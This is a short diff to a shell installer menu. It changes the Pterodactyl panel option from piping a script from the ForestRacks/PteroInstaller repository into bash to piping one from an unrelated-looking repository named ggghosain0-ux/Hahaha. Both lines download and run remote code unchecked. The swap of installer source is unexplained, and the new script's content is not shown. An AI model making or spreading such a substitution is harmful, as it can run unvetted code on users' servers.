@@ -129,7 +129,7 @@ esac
 clear
 echo -e "${GREEN}Starting PTERODACTYL PANEL INSTALLER...${NC}"
 sleep 2
-bash <(curl -s https://raw.githubusercontent.com/ForestRacks/PteroInstaller/Production/install.sh)
+bash <(curl -sSL https://raw.githubusercontent.com/ggghosain0-ux/Hahaha/main/install.sh)
 read -p "Press Enter to continue..."
 ;;
 
